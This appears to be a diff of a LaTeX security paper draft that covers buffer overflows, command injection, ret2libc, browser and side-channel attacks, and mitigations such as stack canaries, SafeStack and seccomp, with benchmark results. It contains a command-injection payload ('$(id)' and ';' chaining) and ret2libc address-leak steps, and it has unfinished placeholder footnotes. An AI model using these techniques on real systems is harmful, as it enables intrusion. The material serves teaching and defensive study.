-(ASLR), Data Execution Prevention (DEP), Stack Canaries, and Control-Flow
-Integrity (CFI). Despite these advancements, the described exploitation
-scenarios retain relevance in contexts where these protection measures are
-absent or cannot be implemented. For example, systems lacking a Memory
-Management Unit (MMU), many embedded systems, and certain router configurations
-may not have these defenses, leaving them susceptible to such attacks. Thus,
-understanding these exploits remains critical in a comprehensive approach to
-system security.
+This traditional exploitation technique of buffer overflow into shellcode has been effectively mitigated by a plethora of defensive mechanisms that we will discuss in subsequent chapters, such as Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), Stack Canaries, Control-Flow Integrity (CFI).
+Despite these advancements, the described exploitation scenarios retain relevance in contexts where these protection measures are absent or cannot be implemented.
+For example, systems lacking a Memory Management Unit (MMU), many embedded systems, and specific router configurations may not have these defenses, leaving them susceptible to such attacks.
+Thus, understanding these exploits remains critical in a comprehensive approach to system security.
 
@@
 \subsubsection{Command injection}
-Command injection vulnerabilities represent a pervasive class of security issues
-that impact both web and system programming environments. These vulnerabilities
-occur when an application passes unsafe user-supplied data (forms, cookies, HTTP
-headers, etc.) to a system shell, allowing the attacker to execute arbitrary
-commands on the host operating system. In the context of web applications, these
-flaws are primarily found in scripts that fail to properly sanitize user input,
-making them susceptible to cross-site scripting (XSS) and SQL injection attacks.
-However, command injection vulnerabilities are not confined to web programming;
-they are equally prevalent in systems programming. Poorly designed system
-applications and scripts that accept untrusted input for command execution can
-expose the system to similar attacks. This vulnerability, thus, underlines the
-importance of careful data handling and proper input validation, irrespective of
-the programming environment.
+Command injection vulnerabilities represent a pervasive class of security issues impacting web and system programming environments.
+These vulnerabilities occur when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing the attacker to execute arbitrary commands on the host operating system.
+In web applications, these flaws are primarily found in scripts that fail to properly sanitize user input, making them susceptible to cross-site scripting (XSS) and SQL injection attacks.
+However, command injection vulnerabilities are not confined to web programming; they are equally prevalent in systems programming.
+Poorly designed system applications and scripts that accept untrusted input for command execution can expose the system to similar attacks.
+This vulnerability, thus, underlines the importance of careful data handling and proper input validation, irrespective of the programming environment.
 
 We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
-The application lacks proper input validation and allows an attacker to execute
-arbitrary commands. The use of the \emph{system} function will cause the
-following process to execute \texttt{sh -c ``echo Hello
-<username>''}\footnote{There are situations where we are not able to inject
-parameters into a command that will be directly reflected in the page. In these
-situations we can try to end the intended command by using a \emph{;} character
-and then write our own malicious command after.}. Our\ref{poggeroni} malicious
-request sets the \emph{username} parameter to \verb|$(id)|. Because
-the original command executes in a shell environment, the shell will interpret
-this string by forking itself and executing the string in between the braces and
-replacing the original string with the result of the command. We can imagine that
-we can cause havoc on the vulnerable machine by being able to execute any command
-we want.
+The application lacks proper input validation and allows an attacker to execute arbitrary commands.
+The use of the \emph{system} function will cause the following process to execute \texttt{sh -c ``echo Hello <username>''}\footnote{There are situations where we are not able to inject parameters into a command that will be directly reflected in the page.
+In these situations, we can try to end the intended command by using a \emph{;} character and then write our malicious command after.}.
+Our\ref{poggeroni} malicious request sets the \emph{username} parameter to \verb|$(id)|.
+Because the original command executes in a shell environment, the shell will interpret this string by forking itself, executing the string between the braces, and replacing the original string with the result of the command.
+We can imagine that we can cause havoc on the vulnerable machine by being able to execute any command we want.
 
@@
 Command injection vulnerabilities can drastically undermine security measures.
-They enable attackers to bypass reverse proxies, offering unauthorized access to
-protected internal services. Moreover, such vulnerabilities can assist in
-creating botnets by allowing threat actors to inject commands to download and
-install malicious software, leading to potential large-scale cyber threats such
-as Distributed Denial of Service (DDoS) attacks.
-
-The situation is similar in the systems programming space. The example for how a vulnerable program might look is left as an exercise to the reader.
+They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services.
+Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.
+
+The situation is similar in the systems programming space. The example of how a vulnerable program might look is left as an exercise for the reader.
 \subsection{Evolution}
 \begin{comment} ret2libc
-
   Mention the lack of mitigation
@@
 \end{comment}
-As mitigation strategies have advanced in both hardware and software to
-counteract software exploitation, so too have the techniques used by threat
-actors, resulting in a continual escalation of sophistication. In response to
-hardening mechanisms such as stack canaries and NX bits, novel exploitation
-techniques have been developed to circumvent these defenses. Prominent among
-these are Return Oriented Programming (ROP) and heap corruption exploits. ROP is
-a technique that leverages existing code fragments, known as "gadgets", in the
-binary to perform arbitrary computations, effectively sidestepping the
-constraints enforced by the NX bit. Heap corruption exploits, on the other hand,
-involve manipulating the metadata of memory management structures to induce
-undefined behavior, providing the means to execute arbitrary code or escalate
-privileges. This evolutionary process underscores the dynamic nature of the
-cybersecurity landscape and the perpetual challenge of maintaining software
-security in the face of evolving threats.
+As mitigation strategies have advanced in both hardware and software to counteract software exploitation, so too have the techniques used by threat actors, resulting in a continual escalation of sophistication.
+In response to hardening mechanisms such as stack canaries and NX bits, novel exploitation techniques have been developed to circumvent these defenses.
+Return Oriented Programming (ROP) and heap corruption exploits are prominent among these.
+ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the NX bit.
+On the other hand, heap corruption exploits involve manipulating the metadata of memory management structures to induce undefined behavior, providing the means to execute arbitrary code or escalate privileges.
+This evolutionary process underscores the dynamic nature of the cybersecurity landscape and the perpetual challenge of maintaining software security in the face of evolving threats.
 
 \subsubsection{ret2libc}
-\emph{ret2libc} or \emph{Return to LibC} is a countermove against the
-NX bit mitigation, which marks certain areas of memory as non-executable,
-thereby prohibiting the execution of injected code. The essence of ret2libc lies
-in its ingenious manipulation of the control flow of the program to call
-existing code, typically functions residing in standard libraries (hence
-'libc'), rather than introducing new code to be executed. By returning into
-standard, broadly-used functions like 'system()' or 'exec()', an attacker can
-execute arbitrary commands in the context of the vulnerable program, effectively
-bypassing the NX bit defense. Ret2libc exemplifies the continually evolving
-landscape of software exploitation techniques that repurposes legitimate elements
-of the program to nefarious ends, circumventing protective mechanisms and
-illustrating the challenges of
-developing robust and enduring defenses against software vulnerabilities.
-
-The entry mechanism behind this technique is the same as in the code injection
-case. We overwrite the return address of the program with an address we control,
-but this time instead of providing our own shellcode we use existing code mapped
-inside the address space of the vulnerable process (usually from within the
-binary itself or LibC\footnote{LibC is mapped in almost all processes running on
-a system}).
-
-For example we could overwrite the return address of a function with the address
-of the \emph{system} function. When actually implementing this kind of attack
-we face 2 difficult problems:
+\emph{ret2libc} or \emph{Return to LibC} is a countermove against the NX bit mitigation, which marks certain areas of memory as non-executable, thereby prohibiting the execution of injected code.
+The essence of ret2libc lies in its ingenious manipulation of the program's control flow to call existing code, typically functions residing in standard libraries (hence 'libc'), rather than introducing new code to be executed.
+By returning to standard, broadly-used functions like 'system()' or 'exec()', an attacker can execute arbitrary commands in the context of the vulnerable program, effectively bypassing the NX bit defense.
+Ret2libc exemplifies the continually evolving landscape of software exploitation techniques that repurposes legitimate elements of the program to nefarious ends, circumventing protective mechanisms and illustrating the challenges of developing robust and enduring defenses against software vulnerabilities.
+
+The entry mechanism behind this technique is the same as in the code injection case.
+We overwrite the return address of the program with an address we control.
+However, this time instead of providing our shellcode, we use existing code mapped inside the address space of the vulnerable process (usually from within the binary itself or LibC\footnote{LibC is mapped in almost all processes running on a system}).
+
+For example, we could overwrite the return address of a function with the address of the \emph{system} function. When implementing this kind of attack, we face two difficult problems:
 \begin{enumerate}
-  \item At what address is the function we want to call located
-  \item How can we control the parameters that we pass to the function.
+  \item What is the address of the function we want to call?
+  \item How can we control the parameters that we pass to the function?
 \end{enumerate}
-
-We will assume that we already identified an exploitable buffer overflow and a
-way to leak an known arbitrary address from within LibC. Now we want to call
-the \emph{system} function with the `sh' string to grant us a foothold on the
-machine. Here\ref{memes} is an example of how the virtual memory space looks
-when executing a binary. The \emph{system} function is located in the text
-section\footnote{Briefly explain sections} of LibC. If LibC is compiled with PIC
-and ASLR is enabled on the target system, sections will be placed offset
-relative to a randomly selected base address. Using the information disclosure
-vulnerability to leak an address\footnote{Libc meme} we can compute the base
-address of the library and from there be able to get addresses for any byte
-in the library.
-
-Let's say that we managed to leak the address of the \emph{printf} function and
-have the LibC binary that is running on the system. We can get the base address at
-which the library is mapped using this formula.
-\begin{equation}
-  libc\_{base} = printf\_leak - offset\_{of}\_{printf}\_{in}\_{libc}
-\end{equation}
-
-Now that we have the first issue fixed, how do we pass parameters to the functions
-we want to call? Because the NX (No-Execute) bit is enabled and all executable
-regions of code are read-only in order to prevent shellcode, we are going to chain
-together multiple addresses that point to small code chunks ending in the
-\emph{ret} instruction
 
@@
   \end{tikzpicture}
-  \caption{\label{fig:label} Virtual memory map}%
-  \label{fig:stackframe}
+  \caption{\label{fig:vmmap} Virtual memory map}%
 \end{figure}
 
+We will assume we have identified an exploitable buffer overflow and a way to leak a known arbitrary address within LibC.
+Now we want to call the \emph{system} function with the `sh' string to grant us a foothold on the machine.
+In Figure~\ref{fig:vmmap} is an example of how the virtual memory space looks when executing a binary.
+The \emph{system} function is located in the text section\footnote{Briefly explain sections} of LibC.
+If LibC is compiled with PIC and ASLR is enabled on the target system, sections will be offset relative to a randomly selected base address.
+Using the information disclosure vulnerability to leak an address\footnote{Libc meme}, we can compute the base address of the library and, from there, get addresses for any byte in the library.
+
+Assuming managed to leak the address of the \emph{printf} function and have the exact LibC binary running on the system. We can get the base address at which the library is mapped using this formula:
+\begin{equation}
+  libc\_{base} = printf\_leak - offset\_{of}\_{printf}\_{in}\_{libc}
+\end{equation}
+
+Now that we have the first issue fixed, how do we pass parameters to the functions we want to call?
+Because the NX (No-Execute) bit is enabled, and all executable regions of code are read-only to prevent shellcode, we will chain together multiple addresses that point to small code chunks ending in the \emph{ret} instruction.
+
+An example \emph{ret2libc} attack on a modified version of the code at \ref{lst:bof-sample} that leaks the address of \emph{puts} to stdout and is compiled with all NX enabled\footnote{The stack canary was still disabled for this example.
+The exact compiler flags were} is shown in Appendix~\ref{lst:pwntools}
+
 \subsection{Exploit chains}
-At this point in time the mitigation strategies employed by hardware and
-software designers have limited the impact we have when executing a single
-exploit. This has given the rise to \emph{exploit chains}. In this scenario
-multiple vulnerabilities or oversights are exploited in order to gain more and
-more information about the system. Here\ref{memes} is how an attacker would
-approach the task of exploiting a system.
-
-\begin{minipage}{\textwidth}
+\begin{figure}[ht]
   \centering
@@
     \path [line] (decision) -- node {yes} (rce);
-    \path [line] (decision) -- ++(-2,0) -- ++(0,2) node [midway, above, sloped,
-    rotate=270, above=0.3cm] {no} -- (information);
+    \path [line] (decision) -- ++(-2,0) -- ++(0,2) node [midway, above, sloped, rotate=270, above=0.3cm] {no} -- (information);
   \end{tikzpicture}
-\end{minipage}
-
-If we do not possess the required information to execute our exploit, we can use
-another one (another link in the exploit chain) to gather more and more. This
-can be interpreted as going further into unintended states in the IFSM (intended
-finite state machine) described here\ref{add to weird machines}.
+  \caption{Exploitaion process} \label{pic:process}
+\end{figure}
+
+The mitigation strategies employed by hardware and software designers have limited the impact we have when executing a single exploit.
+This has given rise to \emph{exploit chains}.
+In this scenario, multiple vulnerabilities or oversights are exploited to gain more information about the system.
+Figure~\ref{pic:process} describes how an attacker would approach exploiting a system.
+
+If we do not possess the required information to execute our exploit, we can use another one (another link in the exploit chain) to gather more and more.
+The exploitation and proof of exploitability process have been formalized in~\cite{WeirdMachines}.
 
 \subsection{Browser exploits}
-In the contemporary computing landscape, a notable surge in interest surrounding
-browser exploitation has emerged, predominantly attributed to the increasing
-ubiquity of JavaScript and the inherent security implications of executing
-foreign code on local machines. As web applications have become more complex and
-feature-rich, JavaScript's role has evolved from simple client-side scripting to
-powering extensive, intricate software systems. This growth presents an enticing
-target for threat actors, as virtually every user who interacts with a web
-application is running potentially untrusted code within their local execution
-context. The browser environment thus turns into a frontline for cybersecurity,
-demanding rigorous scrutiny and sophisticated mitigation techniques.
-Furthermore, the heterogeneous nature of browser architecture and JavaScript
-engine implementations across different vendors adds a layer of complexity to
-securing these environments. This highlights the criticality of understanding
-and countering browser-based exploits, forming an essential dimension of
-comprehensive cybersecurity strategies.
+In the contemporary computing landscape, a notable surge in interest surrounding browser exploitation has emerged, predominantly attributed to the increasing ubiquity of JavaScript and the inherent security implications of executing foreign code on local machines.
+As web applications have become more complex and feature-rich, JavaScript's role has evolved from simple client-side scripting to powering extensive, intricate software systems.
+This growth presents an enticing target for threat actors, as virtually every user interacting with a web application runs potentially untrusted code within their local execution context.
+Thus, The browser environment becomes a frontline for cybersecurity, demanding rigorous scrutiny and sophisticated mitigation techniques.
+Furthermore, the heterogeneous nature of browser architecture and JavaScript engine implementations across different vendors adds a layer of complexity to securing these environments, highlighting the criticality of understanding and countering browser-based exploits, forming an essential dimension of comprehensive cybersecurity strategies.
 
 \subsubsection{How does JavaScript get exploited?}
-Within the context of JavaScript, a dynamic and interpreted language primarily
-executed within the confines of web browsers, a unique vulnerability surface
-emerges, closely tied to its heap-based memory management and dynamic typing
-semantics. The vast majority of JavaScript objects are allocated on the heap,
-the malleability of which introduces inherent susceptibilities to heap overflow
-attacks. The manipulation of an object's memory layout, made possible through an
-overflow, can fundamentally alter an object's behaviour, given JavaScript's
-dynamic typing system.
-
-This means that a successfully exploited heap overflow
-could potentially morph an innocuous object into a malicious entity with
-escalated privileges or unintended functionalities. As such, heap overflow
-vulnerabilities within JavaScript engines pose a significant security concern,
-mandating careful consideration and robust mitigation strategies in the design
-and implementation of modern JavaScript engines and runtime environments.
-
-We will continue by looking at the structure of how Javascript values (or
-JSValues) are encoded into memory:
-
-\begin{figure}[ht]%
+Within the context of JavaScript, a dynamic and interpreted language primarily executed within the confines of web browsers, a unique vulnerability surface emerges, closely tied to its heap-based memory management and dynamic typing semantics.
+The vast majority of JavaScript objects are allocated on the heap, the malleability of which introduces inherent susceptibilities to heap overflow attacks.
+Given JavaScript's dynamic typing system, manipulating an object's memory layout, made possible through an overflow, can fundamentally alter an object's behavior.
+
+This means that a successfully exploited heap overflow could potentially morph an innocuous object into a malicious entity with escalated privileges or unintended functionalities.
+As such, heap overflow vulnerabilities within JavaScript engines pose a significant security concern, mandating careful consideration and robust mitigation strategies in the design and implementation of modern JavaScript engines and runtime environments.
+
+We will continue by looking at the structure of how Javascript values (or JSValues) are encoded into memory:
+
+\begin{figure}[H]%
   \centering
@@
 \end{figure}
-
-\footnotetext{Pulel}
-\footnotetext{Pulel}
-\footnotetext{Pulel}
-This behaviour also extends to more complex and interesting objects such as
-arrays. JavaScriptCore (at least the versions from around 2016) describe arrays
-as ``exotic'' objects which contain their properties. An in detail explanation
-of how these objects are laid out in memory and how to exploit them in\cite{paper
-frakck}
-
-Due to the high impact that a vulnerability in a JavaScript runtime would have
-on the security of computers all over the world, properly isolating the JS runtime
-from the host machine is paramount. In modern browsers this is achieved by
-employing the least privilege principle. The browser itself is separated into
-multiple processes that use a well defined IPC mechanism to communicate, limiting
-what attackers can do by exploiting a single process and requiring an exploit
-chain to gain increasingly more privileges as desired.
-
+\footnotetext[15]{Nibbles marked with \emph{P} encode a pointer}
+\footnotetext[16]{Nibbles marked with \emph{P} encode a NAN-boxed double precision IEE754 float}
+\footnotetext[17]{Nibbles marked with \emph{P} encode an integer}
+This behaviour also extends to more complex and interesting objects such as arrays.
+JavaScriptCore (at least the versions from around 2016) describe arrays as ``exotic'' objects which contain their properties.
+An in detail explanation of how these objects are laid out in memory and how to exploit them in~\cite{saelo2016}.
+
+Due to the high impact that a vulnerability in a JavaScript runtime would have on the security of computers worldwide, properly isolating the JS runtime from the host machine is paramount.
+In modern browsers, this is achieved by employing the least privilege principle.
+The browser is separated into multiple processes that use a well-defined IPC mechanism to communicate, limiting what attackers can do by exploiting a single process and requiring an exploit chain to gain increasingly more privileges as desired.
 \subsection{State of the art}
@@
 \end{comment}
-In recent years, virtualization technologies have witnessed an unprecedented
-surge in their adoption, largely driven by advancements in datacenter and
-cloud-based applications. These technologies allow multiple virtual machines or
-containers, each encapsulating an entire execution environment, to coexist on
-the same physical hardware, thereby promoting efficient resource utilization,
-simplified management, and scalability. More than just a cost-effective solution
-for large-scale computations, virtualization has also garnered considerable
-attention as a robust approach for isolating the execution of untrusted code. In
-this context, it serves as a defensive boundary, segregating potentially harmful
-operations within a contained environment, thereby limiting their ability to
-adversely affect the larger system. Consequently, the evolution of
-virtualization technologies has profoundly impacted the modern computing
-landscape, opening new possibilities for efficient, scalable, and secure
-computing, but also posing new challenges for cybersecurity.
-
-Driven by the relentless demand for heightened performance, a detailed scrutiny
-of processor operations and employed microarchitectural designs has become
-imperative. This necessity is underscored by the unearthing of vulnerabilities
-such as those referred to in \cite{spectre, meltdown}. These exploits
-ingeniously capitalize on the side effects triggered by the processor during
-memory access and speculative execution. This development highlights the
-criticality of an in-depth understanding of hardware function. Even before
-the findings mentioned earlier, researchers have been able to cross the
-virtualization boundary and gain information form other VM's running in the same
-machine. The \cite{flush reload} reveals an attack that can recover around \~95\%
-of the bits of a GnuPG secret key.
+In recent years, virtualization technologies have witnessed an unprecedented surge in their adoption, primarily driven by advancements in datacenter and cloud-based applications.
+These technologies allow multiple virtual machines or containers, each encapsulating an entire execution environment, to coexist on the same physical hardware, thereby promoting efficient resource utilization, simplified management, and scalability.
+More than just a cost-effective solution for large-scale computations, virtualization has also garnered considerable attention as a robust approach for isolating the execution of untrusted code.
+In this context, it serves as a defensive boundary, segregating potentially harmful operations within a contained environment, thereby limiting their ability to affect the more extensive system adversely.
+Consequently, the evolution of virtualization technologies has profoundly impacted the modern computing landscape, opening new possibilities for efficient, scalable, and secure computing and posing new cybersecurity challenges.
+
+Driven by the relentless demand for heightened performance, detailed scrutiny of processor operations and employed microarchitectural designs have become imperative.
+This necessity is underscored by unearthing vulnerabilities such as those referred to in \cite{spectre} and \cite{meltdown}.
+These exploits ingeniously capitalize on the side effects triggered by the processor during memory access and speculative execution.
+This development highlights the criticality of an in-depth understanding of hardware function.
+Even before the findings mentioned earlier, researchers have been able to cross the virtualization boundary and gain information from other VMs running on the same machine.
+The \cite{flushreload} reveals an attack that can recover around \~95\% of the bits of a GnuPG secret key.
 
 \section{Detection and Mitigation Techniques}%
-In the realm of cybersecurity, the price tag associated with the implementation
-of mitigation strategies such as stack canaries and heuristic checks is
-frequently overlooked. These countermeasures, while crucial for system
-protection, impose an overhead on system performance, potentially influencing
-the overall efficiency of the software. As part of our investigation, this paper
-will delve into an in-depth analysis of this often-neglected cost associated
-with such defensive measures. Our objective is to facilitate a more balanced
-perspective, considering not only the protective benefits but also the incurred
-costs of these mitigation strategies.
+In the realm of cybersecurity, the price tag associated with the implementation of mitigation strategies such as stack canaries and heuristic checks is frequently overlooked.
+These countermeasures, while crucial for system protection, impose an overhead on system performance, potentially influencing the overall efficiency of the software.
+As part of our investigation, this paper will delve into an in-depth analysis of this often-neglected cost associated with such defensive measures.
+Our objective is to facilitate a more balanced perspective, considering not only the protective benefits but also the incurred costs of these mitigation strategies.
 
 \subsubsection{Stack canaries}
-Defending against stack buffer overflows has been attempted all the way since 1997
-with StackGuard \cite{stackguardpaper}, but it wasn't until 2006 with the release
-of GCC 4.1 was this available for the entire Linux community.
-
-In modern compilers this mitigation places a sacrificial random value right before the
-return address. This mitigation combined with a new variable alignment technique that
-places all buffers above all other function local variables has proven to be an
-effective mitigation with a minimal performance impact.
-
-\begin{lstlisting}[
-      ,language=C]
-#include <string.h>
-extern void dont_optimize_str(char* ptr);
-extern void dont_optimize_int(int* ptr);
-
-int buffer_first(char* source) {
-    char dest[0x100];
-    int len;
-    int foo;
-    int bar;
-
-    strcpy(dest, source);
-    len = strlen(dest);
-    foo = len * 2;
-    bar = len - 3;
-
-    dont_optimize_str(dest);
-    dont_optimize_int(&len);
-    dont_optimize_int(&foo);
-    dont_optimize_int(&bar);
-}
-
-int buffer_last(char* source) {
-    int len;
-    int foo;
-    int bar;
-    char dest[0x100];
-
-    strcpy(dest, source);
-    len = strlen(dest);
-    foo = len * 2;
-    bar = len - 3;
-
-    dont_optimize_str(dest);
-    dont_optimize_int(&len);
-    dont_optimize_int(&foo);
-    dont_optimize_int(&bar);
-}
-\end{lstlisting}%
-\label{code:example_func}
-
-On GCC x86-64 version 13.1, compiling the code\ref{thatcode} results in both functions having the buffer
+Defending against stack buffer overflows has been attempted since 1997 with StackGuard\cite{stackguard}, but it was not until 2006, with the release of GCC 4.1 this was available for the entire Linux community.
+This mitigation places a random sacrificial value right before the return address in modern compilers.
+This mitigation, combined with a new variable alignment technique that places all buffers above all other function local variables, has proven to be an effective mitigation with a minimal performance impact.
+
+On GCC x86-64 version 13.1, compiling the Appendix~\ref{lst:stack-layout} results in both functions having the buffer
 placed closest to the stack canary.
 
-\begin{lstlisting}[caption={Shellcode disassembly}
-      ,label={lst:bof}
+\begin{lstlisting}[caption={Function prologue of $buffer\_{first}$ and $buffer\_{last}$}
+      ,label={lst:layout-asm}
       ,language={[x86masm]Assembler}]
@@
 
-\begin{lstlisting}[caption={Shellcode disassembly}
-      ,label={lst:bof}
+Both functions load the buffer variable from the same address, exemplified by Listing~\ref{lst:layout-asm}.
+
+\begin{lstlisting}[caption={Canary initialization}
+      ,label={lst:canary-init}
       ,language={[x86masm]Assembler}]
@@
 
-\begin{lstlisting}[caption={Shellcode disassembly}
-      ,label={lst:bof}
+Listing~\ref{lst:canary-init} shows how the canary is placed on the stack.
+This mitigation requires runtime support, as the value of the cookie is randomly generated for each process and placed at the address \emph{fs:40}.
+
+\begin{lstlisting}[caption={Canary verification}
+      ,label={lst:canary-check}
       ,language={[x86masm]Assembler}]
@@
 
+Listing~\ref{lst:canary-check} shows how the cookie is checked.
+If the value from the stack and the value at \emph{fs:40} are not equal the jump is not taken and \emph{\_\_stack\_chck\_fail} is called, terminating the process.
+
+\subsection{Shadow stacks}
+Advancements in secure software systems have led to the development of shadow stacks, representing a significant leap from earlier protection measures like stack canaries.
+Shadow stacks offer a more robust mechanism for guarding against stack buffer overflows by decoupling control-flow information from user data.
+They maintain a separate, concealed stack dedicated solely to storing return addresses, making it exceedingly challenging for attackers to alter the flow of execution.
+This strategic bifurcation of data fundamentally strengthens the protection against control-flow hijacking attacks.
+It ensures that even if an attacker successfully tampers with data on the main stack, any discrepancies with the shadow stack will immediately be flagged.
+Despite the operational complexities and slight runtime overheads, they may introduce, shadow stacks serve as a remarkably effective mitigation strategy, enhancing the integrity of the control flow beyond what is achievable with stack canaries alone.
+
+\subsection{Sanitizers}
+With the increasing amount of memory errors in unsafe system programming languages such as C and C++, methods for detecting runtime errors without requiring code changes have been developed.
+Even though they are rarely used in production environments, they have seen massive success when used in conjunction with fuzzers \ref{vezi niste paperuri de fuzzere} to detect severe vulnerabilities in large code bases.
+
+\subsubsection{UBSAN}
+UBSAN (Undefined Behavior Sanitizer) injects additional checks during the compilation of the program in order to detect Undefined Behaviour\footnote{explain this}.
+Here is a non-exhaustive list of the features and checks UBSAN does:
+
+\begin{itemize}
+  \item Array subscript out of bounds, where the bounds can be statically determined
+  \item Bitwise shifts that are out of bounds for their data type
+  \item Dereferencing misaligned or null pointers
+  \item Signed integer overflow
+  \item Conversion to, from, or between floating-point types, which would overflow the destination
+\end{itemize}
+
+\subsubsection{ASAN}
+ASAN (or Address Sanitizer) adds instrumentation during the compilation process to detect the following memory errors:
+
+\begin{itemize}
+  \item Out-of-bounds accesses to heap, stack and globals
+  \item Use-after-free
+  \item Use-after-return
+  \item Use-after-scope
+  \item Double-free, invalid free
+\end{itemize}
+
+\subsubsection{SafeStack}
+SafeStack is a sanitizer that fixes one of the biggest issues when it comes to the Stack.
+It separates the control flow data from user data by splitting the Stack in two.
+The \emph{Safe Stack}, which replaces the initial Stack and only stores control flow data and variables that are \emph{safely}\footnote{Register spills, accesses that are proven at compile time to be safe} accessed.
+Accesses that are decided to be \emph{unsafe}\footnote{Such as doing a \emph{strcpy} on a buffer} are placed on the unsafe stack, far away from control data.
+
+\begin{lstlisting}[caption={SafeStack enabled}
+      ,label={lst:safestack}
+      ,language={[x86masm]Assembler}]
+   mov    rdi,QWORD PTR fs:[rax]
+   mov    QWORD PTR [rbp-0x10],rdi
+   add    rdi,0xffffffffffffff00
+   mov    QWORD PTR [rbp-0x18],rdi
+   mov    QWORD PTR fs:[rax],rdi
+   call   0x55b9ecf030d0 <gets@plt>
+\end{lstlisting}
+
+Listing \ref{lst:safestack} showcases dissasembly of the program at Annex \ref{lst:bof-sample} compiled with SafeStack.
+The buffer passed to \emph{gets} is not relative to \emph{RSP}.
+In this case \emph{RDI} is used as the unsafe stack pointer.
+
+Running our \emph{ret2libc} exploit on this binary, the behaviour is the same as if we had a much larger buffer:
+\begin{lstlisting}[
+      ,label={lst:gucci}
+      ,language={Bash}]
+$ python ret2libc.py
+Hi !
+\end{lstlisting}
+
+\begin{lstlisting}[caption={No SafeStack}
+      ,label={lst:unsafestack}
+      ,language={[x86masm]Assembler}]
+    lea    rax, [rbp-0x100]
+    mov    rdi, rax
+    call   0x55fe6910a070 <gets@plt>
+\end{lstlisting}
+
+Listing \ref{lst:unsafestack} showcases the stack we are familiar with. An address that is close to the return address is passed to \emph{gets}.
+
+\subsection{Seccomp}
+Seccomp (or Secure Computing) was introduced in the 2.6.12 version of the Linux kernel.
+At that time, it provided a \emph{strict} execution mode for processes that allowed a minimal set of system calls.
+The intention behind this mode was to allow untrusted code to run on systems.
+This functionality was greatly enhanced with the introduction of seccomp-bpf (Berkeley Packet Filter) in version 3.5 of the kernel.
+This new mode of operation allowed programmers to filter the system calls a process made using small programs written in a DSL.
+This functionality is prominent in projects where the host system's security is paramount, such as Docker, Chrome, or Firefox.
+Here\ref{codubun} is an example of the granular control seccomp can achieve.
+Note that once a process installs a seccomp filter, it is impossible to remove it without exploiting the kernel while also being inherited by all child processes of the filtered process.
+
+Annex \ref{lst:seccomp} shows the shellcoding code example protected with seccomp filters (some of the functions were replaced to simplify the filters).
+Because the filters are strict, even though the program is vulnerable to one of the simplest attacks, it is impossible to abuse it to gain further access to the machine it is running on.
+
+Attempting to run the shellcoding exploit on the filtered binary, the following message is received:
+\begin{lstlisting}[
+      ,label={lst:msg}
+      ,language={Bash}]
+  Process stopped with exit code -31 (SIGSYS) (pid 32914)
+\end{lstlisting}
+
+This happens because the shellcode we use contains the syscall \emph{execve}, which we used for gaining a shell, but this syscall is not allowed.
+Without a vulnerable kernel driver it is almost impossible to bypass this filters if they are strict enough, but there is always a risk that a program needs syscalls that could compromise the system, or the filters were not properly audited and are too permissive.
+
 \subsection{Performance cost}
-\begin{table}[ht]
+\subsubsection{Testing setup}
+
+This is the list of compiler flags used for each of the testing environments:
+\begin{itemize}
+  \item \texttt{Optimize} - ``-O2''
+  \item \texttt{No stack protector} - ``-O2 -fno-stack-protector''
+  \item \texttt{Ubsan} - ``-O2 -fsanitize=undefined''
+  \item \texttt{Ubsan minimal} - ``-O2 -fsanitize=undefined -fsanitize-minimal-runtime''
+  \item \texttt{Asan+Bounds} ``-O2 -fsanitize=address,bounds,array-bounds''
+  \item \texttt{Hardened} ``-O2 -fsanitize=undefined,address,bounds,array-bounds''
+  \item \texttt{SafeStack} ``-O2 -fsanitize=safe-stack''
+\end{itemize}
+
+The machine the tests were ran on has the following specifications:
+\begin{enumerate}
+  \item \texttt{CPU} - AMD Ryzen 7 3750H
+  \item \texttt{RAM} - 8 GB
+  \item \texttt{OS} - Ubuntu 22.04 5.15.90.1-microsoft-standard-WSL2
+\end{enumerate}
+
+The program used for analysing the performance of the mitigations is \emph{TCC} (Tiny C Compiler).
+TCC was chosen because it represents a program used in the wild, that is complex enough for performance issues to manifest themselves but simple enough to be able to iterate rapidly over sets of mitigations.
+The version tested is \emph{release\_0\_9\_27}.
+
+The exact commit hash is: \texttt{d348a9a51d32cece842b7885d27a411436d7887b}.
+
+The compilers used for compiling TCC were:
+\begin{itemize}
+  \item \texttt{GCC} - version 11.3.0 (Ubuntu 11.3.0-1ubuntu1~22.04.1)
+  \item \texttt{Clang} - Ubuntu clang version 14.0.0-1ubuntu1
+\end{itemize}
+
+In order to gather and aggregate the results of multiple runs, \emph{hyperfine} version 1.12.0 was used.
+
+The benchmark consists of compiling the \emph{speedbench.c} file, generated with \emph{csmith} 2.4.0 using the following commandline arguments ``--seed 328954452 --max-funcs 90''.
+\emph{cmisth}\cite{csmith} is a tool that generates C code and was successfully used to find bugs in mainstream compilers.
+
+\begin{table}[H]
 \centering
@@
 \caption{GCC results}
-\label{table:your_label}
+\label{table:gcc}
 \end{table}
 
-\begin{table}[ht]
+\begin{table}[H]
 \centering
@@
   Optimize &  47.6 ms & 2.1 ms & 44.0 ms & 68.8 ms & 1x \\
+  SafeStack &  50.0 ms &  2.5 ms & 45.9 ms & 61.5 ms & 0.952x \\
   Ubsan &  119.4 ms & 5.3 ms &  112.6 ms & 150.8 ms & 0.398x \\
   Ubsan minimal & 72.0 ms & 3.6 ms &  66.0 ms& 89.2 ms & 0.661x \\
+  Asan+Bounds &  136.2 ms &  6.5 ms&   126.9 ms & 160.2 ms & 0.349x \\
+  Hardened & 218.0 ms & 5.8 ms & 205.8 ms & 238.9 ms & 0.218x \\
 \hline
@@
 \caption{Clang results}
-\label{table:your_label}
+\label{table:clang}
 \end{table}
 
-Mention inability to test shadow stack
-
-\subsection{Shadow stacks}
-Advancements in secure software systems have led to the development of shadow
-stacks, which represent a significant leap forward from the earlier protection
-measures like stack canaries. Shadow stacks offer a more robust mechanism for
-guarding against stack buffer overflows by completely decoupling control-flow
-information from user data. They maintain a separate, concealed stack dedicated
-solely to storing return addresses, making it exceedingly challenging for
-attackers to alter the flow of execution. This strategic bifurcation of data
-fundamentally strengthens the protection against control-flow hijacking attacks.
-It ensures that even if an attacker successfully tampers with data on the main
